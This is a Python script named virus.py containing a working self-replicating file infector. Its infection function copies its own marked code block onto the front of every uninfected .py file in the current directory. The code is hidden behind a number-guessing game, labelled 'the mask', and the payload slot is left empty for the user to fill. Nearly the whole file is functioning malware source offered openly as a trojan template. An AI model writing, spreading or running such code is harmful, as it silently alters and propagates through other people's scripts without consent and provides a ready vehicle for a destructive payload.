# virus.py

### THE VIRUS STARTS HERE ###

def infection():
    import sys, glob
    code = []

    with open(sys.argv[0], 'r') as f:
        lines = f.readlines()

    virus_area = False

    for line in lines:
        if line == '### THE VIRUS STARTS HERE ###\n':
            virus_area = True
        if virus_area:
            code.append(line)
        if line == '### THE VIRUS ENDS HERE ###\n':
            break

    python_scripts = glob.glob('*.py')

    for script in python_scripts:
        with open(script, 'r') as f:
            script_code = f.readlines()

        infected = False
        for line in script_code:
            if line == '### THE VIRUS STARTS HERE ###\n':
                infected = True
                break

        if not infected:
            final_code = []
            final_code.extend(code)
            final_code.extend('\n')
            final_code.extend(script_code)

            with open(script, 'w') as f:
                f.writelines(final_code)

# Malicious piece of code (payload)


### THE VIRUS ENDS HERE ###


# The mask goes here
def mask():
    import random

    print("Hi welcome to the game, This is a number guessing game.\nYou got 7 chances to guess the number. Let's start the game")

    number_to_guess = random.randrange(100)

    chances = 7

    guess_counter = 0

    while guess_counter < chances:

        guess_counter += 1
        my_guess = int(input('Please Enter your Guess : '))

        if my_guess == number_to_guess:
            print(f'The number is {number_to_guess} and you found it right !! in the {guess_counter} attempt')
            break

        elif guess_counter >= chances and my_guess != number_to_guess:
            print(f'Oops sorry, The number is {number_to_guess} better luck next time')

        elif my_guess > number_to_guess:
            print('Your guess is higher ')

        elif my_guess < number_to_guess:
            print('Your guess is lesser')


infection()
mask()